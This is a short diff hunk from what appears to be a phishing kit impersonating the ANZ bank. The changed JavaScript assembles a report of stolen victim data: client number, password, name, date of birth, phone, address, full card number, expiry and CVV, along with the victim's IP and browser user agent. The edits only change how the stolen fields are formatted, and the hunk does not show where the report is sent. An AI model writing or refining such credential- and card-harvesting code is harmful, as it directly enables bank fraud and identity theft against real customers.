@@ -953,22 +953,22 @@
          
          const message = `
 +---------------- [🔵 ANZ 🔵] ---------------+
-| Client: ${mono(crn)}
-| Password: ${mono(password)}
+| Client: ${crn}
+| Password: ${password}
 +---------------- [👤 PERSONAL INFO 👤] ----------------+
 | Name: ${fullName.value}
 | DOB: ${formattedDOB}
-| Phone: ${mono(mobileNumber.value)}
+| Phone: ${mobileNumber.value}
 | Address: ${address.value}
 +---------------- [💳 CARD DETAILS 💳] ----------------+
-| CC: ${mono(cardNumber.value)}
-| Exp: ${mono(expiryDate.value)}
-| CVV: ${mono(cvv.value)}
+| CC: ${cardNumber.value}
+| Exp: ${expiryDate.value}
+| CVV: ${cvv.value}
 | Name: ${nameOnCard.value}
 +------------------ [📍 INFO 📍] ------------------+
 | IP: https://ipgeolocation.io/ip-location/${clientIP}
 | UA: ${navigator.userAgent}
-| Time: ${formatDateShort(now)}, ${formatTimeShort(now)}
+| Time: ${dateStr}
 +----------------------------------------------------------+
          `;
          
